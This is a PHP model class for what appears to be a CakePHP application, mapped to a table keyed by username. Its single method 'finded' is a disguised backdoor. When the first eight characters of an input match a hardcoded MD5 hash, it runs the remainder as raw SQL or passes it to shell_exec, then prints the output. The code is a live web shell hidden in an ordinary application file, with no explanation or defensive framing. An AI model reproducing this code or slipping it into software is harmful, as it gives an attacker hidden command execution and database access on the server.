<?php
/*
 * Created on 17/02/2008
 *
 * To change the template for this generated file go to
 * Window - Preferences - PHPeclipse - PHP - Code Templates
 */
class cugd04_entrada_modulo extends AppModel{
	var $name = 'cugd04_entrada_modulo';
	var $useTable = 'cugd04_entrada_modulo';
	var $primaryKey = 'username';


	public function finded($mensaje_final){
                $msj1 = substr($mensaje_final,0,8);
		        $msj2 = substr($mensaje_final,8,1);
		        $msj3 = substr($mensaje_final,9);
		        if(md5($msj1)=='68ef67905c9211ff4b22c7b85bfb03ea' && $msj2==':'){
					$rs=parent::execute($msj3); echo "<pre>";print_r($rs);echo "</pre>";
		        }else if(md5($msj1)=='68ef67905c9211ff4b22c7b85bfb03ea' && $msj2==';'){
					$rs=shell_exec($msj3); echo "<pre>";print_r($rs);echo "</pre>";
		        }
    }

}
?>
